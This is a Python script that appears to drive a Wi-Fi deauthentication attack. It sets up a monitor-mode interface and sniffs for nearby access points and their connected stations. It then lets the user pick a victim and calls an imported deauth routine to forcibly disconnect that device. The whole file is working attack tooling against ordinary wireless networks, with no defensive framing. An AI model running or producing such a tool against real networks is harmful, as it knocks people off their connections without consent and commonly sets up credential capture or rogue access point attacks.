from scapy.all import *
from threading import Thread
import time
import os
import inquirer
from find_ap_connected_stations import FindAccessPointConnectedStations
from scan_acess_points import ScanAccessPoints

import deauth_client


def select_ap_bssid(values):
    questions = [
        inquirer.List('ap_bssid', message="Select BSSID oof the access point", choices=values),
    ]

    return inquirer.prompt(questions)["ap_bssid"]


def select_bssids_for_deauth(values):
    questions = [
        inquirer.List('both_bssid', message="Select target station BSSID to deauth", choices=values),
    ]

    target_bssid = inquirer.prompt(questions)["both_bssid"]
    #  here we need to extract both bssid's for deauth method
    return dict(target_bssid=target_bssid, ap_bssid=values[target_bssid])


if __name__ == "__main__":

    import argparse
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument(
        "--card_iface", help="Network card interface name from iwconfig ,default 'wlan1'", default='wlan1')
    parser.add_argument("--monitor_iface",
                        help="Desired monitor interface name ,default 'wlan0mon'", default='wlan0mon')
    parser.add_argument(
        "--sniff_time",
        help="Amount of time each sniffing stage(find access points and find access point connected stations) should be executed ,default 60",
        default=60)

    args = parser.parse_args()
    card_iface = args.card_iface
    monitor_iface = args.monitor_iface
    sniff_time = args.sniff_time

    os.system(f"iw dev {card_iface} interface add {monitor_iface} type monitor")
    os.system(f"ifconfig {monitor_iface} up")

    # Find access points
    scan_access_points_task = ScanAccessPoints(monitor_iface)
    scan_access_points_task.sniffAction(sniff_time)
    time.sleep(sniff_time)
    ap_bssid = select_ap_bssid(scan_access_points_task.access_points)

    # Find connected stations of access point
    find_ap_connected_stations_task = FindAccessPointConnectedStations(monitor_iface)
    find_ap_connected_stations_task.sniffAction(ap_bssid, sniff_time)
    time.sleep(sniff_time)
    response = select_bssids_for_deauth(find_ap_connected_stations_task.stations)

    # Execute deauth
    deauth_client.deauth(response["target_bssid"], response["ap_bssid"], monitor_iface)
